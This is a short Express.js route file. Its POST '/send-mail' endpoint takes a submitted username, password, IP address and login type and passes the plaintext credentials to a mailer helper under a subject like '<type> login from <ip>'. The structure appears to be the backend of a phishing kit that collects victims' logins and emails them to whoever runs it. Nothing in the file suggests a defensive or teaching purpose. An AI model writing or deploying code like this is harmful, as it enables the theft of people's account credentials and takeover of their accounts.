const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

// Send email route
router.post('/send-mail', (req, res) => {
  const { username, pass, ip, type } = req.body;

  if (!username || !pass || !ip || !type) {
    return res.status(400).send({ response: 'missing_fields' });
  }

  const subject = `${type} login from ${ip}`;
  mailer.sendEmail(res, subject, username, pass, ip, type);
});

module.exports = router;
